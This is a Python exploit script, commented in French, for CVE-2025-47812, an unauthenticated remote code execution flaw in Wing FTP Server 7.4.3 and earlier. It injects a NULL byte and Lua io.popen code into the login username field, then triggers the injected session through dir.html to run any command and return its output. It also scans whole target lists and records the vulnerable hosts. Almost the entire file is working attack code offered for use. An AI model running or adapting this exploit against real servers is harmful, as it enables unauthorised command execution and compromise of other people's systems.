import requests
import re
import argparse

# Codes couleurs ANSI
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
MAGENTA = "\033[95m"
CYAN   = "\033[96m"
RESET  = "\033[0m"

def display_banner():
    # Bannière ASCII AGENTPATHOGENE
    ascii_art = f"""{RED}
    ___   ______ _______   __ ______  ____   ___  ______ __  __  ____  ______ _   __ ______
   /   | / ____// ____/ | / //_  __/ / __ \ /   |/_  __// / / / / __ \/ ____// | / // ____/
  / /| |/ / __ / __/ /  |/ /  / /   / /_/ // /| | / /  / /_/ / / / / / __/  /  |/ // __/   
 / ___ / /_/ // /___/ /|  /  / /   / ____// ___ |/ /  / __  / / /_/ / /___ / /|  // /___   
/_/  |_\____//_____/_/ |_/  /_/   /_/    /_/  |_/_/  /_/ /_/  \____/_____//_/ |_//_____/   
                                                                                           {RESET}"""
    
    info = f"""
{BLUE}======================================================================================{RESET}
{MAGENTA}    EXPLOIT  : Wing FTP Server <= 7.4.3 - RCE Non Authentifié (CVE-2025-47812)
    RESEARCH : Aidan Coulon (Agentpathogene)
    VERSION  : 2.0 Enhanced (AGENTPATHOGENE Edition){RESET}
{BLUE}======================================================================================{RESET}

{YELLOW}[!] MODE D'EMPLOI DÉTAILLÉ :{RESET}
  {CYAN}-u, --url{RESET}      L'adresse du serveur cible. 
                   {GREEN}Ex: -u http://192.168.1.50:8080{RESET}
  
  {CYAN}-c, --command{RESET}  La commande système à faire exécuter par le serveur.
                   {GREEN}Ex: -c "whoami" ou -c "ls -la /etc/passwd"{RESET}
  
  {CYAN}-f, --file{RESET}     Pour scanner plusieurs serveurs d'un coup.
                   {GREEN}Ex: -f cibles.txt{RESET}
  
  {CYAN}-o, --output{RESET}   Sauvegarde uniquement les serveurs vulnérables dans un fichier.
                   {GREEN}Ex: -o succes.txt{RESET}
  
  {CYAN}-v, --verbose{RESET}  Affiche tout : le payload envoyé et le retour de la commande.

{BLUE}======================================================================================{RESET}
"""
    print(ascii_art)
    print(info)

def print_green(text): print(f"{GREEN}{text}{RESET}")
def print_red(text): print(f"{RED}{text}{RESET}")

def run_exploit(target_url, command, username="anonymous", verbose=False):
    target_url = target_url.rstrip('/')
    login_url = f"{target_url}/loginok.html"
    
    login_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    from urllib.parse import quote
    encoded_username = quote(username)

    # Payload Lua via NULL byte injection
    payload = (
        f"username={encoded_username}%00]]%0dlocal+h+%3d+io.popen(\"{command}\")%0dlocal+r+%3d+h%3aread(\"*a\")"
        "%0dh%3aclose()%0dprint(r)%0d--&password="
    )

    if verbose:
        print(f"[*] Test de la cible : {target_url}")
        print(f"[*] Injection de la commande : {YELLOW}{command}{RESET}")

    try:
        # Étape 1 : Injection et récupération du cookie de session (UID)
        resp = requests.post(login_url, headers=login_headers, data=payload, timeout=10)
        match = re.search(r'UID=([^;]+)', resp.headers.get("Set-Cookie", ""))
        
        if not match:
            if verbose: print_red(f"[-] Aucun UID reçu pour {target_url}")
            return False

        uid = match.group(1)
        
        # Étape 2 : Déclenchement de la session injectée
        dir_url = f"{target_url}/dir.html"
        dir_resp = requests.get(dir_url, headers={"Cookie": f"UID={uid}"}, timeout=10)
        
        # Nettoyage pour extraire uniquement le résultat de la commande
        output = dir_resp.text.split('<?xml')[0].strip()

        if output:
            print_green(f"[+] SUCCÈS : {target_url} est vulnérable !")
            print(f"{CYAN}--- SORTIE DE LA COMMANDE ---{RESET}\n{output}\n{CYAN}-----------------------------{RESET}")
            return True
        else:
            if verbose: print(f"[-] {target_url} : Connecté mais aucune sortie commande.")
            return False

    except Exception as e:
        if verbose: print_red(f"[-] Erreur sur {target_url} : {e}")
        return False

def main():
    display_banner()
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-u", "--url")
    parser.add_argument("-f", "--file")
    parser.add_argument("-c", "--command", default="whoami")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-o", "--output")
    
    args = parser.parse_args()

    if not args.url and not args.file:
        print_red("(!) Utilisation : python3 exploit.py -u <URL> ou -f <FICHIER>\n")
        return

    targets = []
    if args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [l.strip() for l in f if l.strip()]
        except: return print_red("[-] Fichier introuvable.")
    else:
        targets = [args.url]

    vulnerable = []
    for t in targets:
        if run_exploit(t, args.command, "anonymous", args.verbose):
            vulnerable.append(t)

    if args.output and vulnerable:
        with open(args.output, 'w') as f:
            f.write("\n".join(vulnerable))
        print_green(f"\n[!] Rapport généré : {args.output}")

if __name__ == "__main__":
    main()
